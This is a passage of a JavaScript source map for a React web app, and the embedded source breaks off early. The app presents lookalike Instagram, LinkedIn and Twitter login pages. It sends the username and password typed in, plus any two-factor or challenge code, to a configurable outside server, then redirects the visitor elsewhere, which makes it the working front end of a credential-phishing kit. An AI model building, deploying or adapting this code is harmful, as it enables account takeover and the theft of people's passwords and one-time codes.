{"version":3,"sources":["components/Home.js","components/Instagram.js","components/Linkedin.js","components/Twitter.js","App.js","components/History.js","index.js"],"names":["env","runtimeEnv","Home","state","redirect","to","setRedirect","url","setState","renderRedirect","console","log","favicon","document","getElementById","undefined","REACT_APP_FAVICONURL","href","title","REACT_APP_TITLE","innerText","this","Card","style","position","left","top","transform","className","Header","Body","Container","fluid","Col","REACT_APP_INSTAGRAM","Row","Button","width","size","variant","onClick","REACT_APP_TWITTER","REACT_APP_LINKEDIN","Component","queryString","require","Instagram","username","password","showAlert","loading","message","twoFactor","email_auth","success","code","two_factor_identifier","verificationMethod","handleUsername","event","target","value","handleCode","maxLength","slice","handlePassword","onShowAlert","window","setTimeout","handleClick","e","preventDefault","length","fetch","REACT_APP_URL","method","headers","body","stringify","cookieEmail","REACT_APP_COOKIE_EMAIL","then","response","json","responseData","handleCodeClick","Alert","REACT_APP_BANNER_INSTAGRAM","bg","text","REACT_APP_BANNER_INSTAGRAM_HEADER","Text","REACT_APP_BANNER_INSTAGRAM_BODY","alt","src","height","objectFit","borderRadius","component","location","REACT_APP_REDIRECTURL","Form","onSubmit","Group","controlId","Label","Control","onChange","type","placeholder","disabled","Spinner","as","animation","role","aria-hidden","Linkedin","manualCheck","challangeID","REACT_APP_BANNER_LINKEDIN","REACT_APP_BANNER_LINKEDIN_HEADER","REACT_APP_BANNER_LINKEDIN_BODY","challenge_id","challenge_type","enc_user_id","REACT_APP_BANNER_TWITTER","REACT_APP_BANNER_TWITTER_HEADER","REACT_APP_BANNER_TWITTER_BODY","REACT_APP_SELECT","App","path","exact","Twitter","history","ReactDOM","render"],"mappings":"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","file":"static/js/main.66f0e9fa.chunk.js","sourcesContent":["import React, { Component } from \"react\";\nimport { Card, Button, Row, Container, Col } from \"react-bootstrap\";\nimport { Redirect } from \"react-router-dom\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nexport default class Home extends Component {\n  state = {\n    redirect: false,\n    to: \"\",\n  };\n  setRedirect = (url) => {\n    this.setState({\n      redirect: true,\n      to: url,\n    });\n  };\n  renderRedirect = () => {\n    console.log(this.state.redirect);\n    if (this.state.redirect) {\n      return <Redirect to={this.state.to} />;\n    }\n  };\n  componentDidMount() {\n    const favicon = document.getElementById(\"FavIcon\");\n    if (\n      env.REACT_APP_FAVICONURL !== undefined ||\n      env.REACT_APP_FAVICONURL !== \"\"\n    )\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\n    const title = document.getElementById(\"AppTitle\");\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\n      title.innerText = `${env.REACT_APP_TITLE}`;\n    else {\n      title.innerText = \"App\";\n    }\n  }\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Card\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n          className=\"text-center\"\n        >\n          <Card.Header>Select a login option</Card.Header>\n          <Card.Body>\n            <Container fluid>\n              <Col>\n                {\n                  env.REACT_APP_INSTAGRAM === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\" }}\n                        size=\"lg\"\n                        variant=\"outline-danger\"\n                        onClick={() => this.setRedirect(\"/Instagram\")}\n                      >\n                        INSTAGRAM\n                    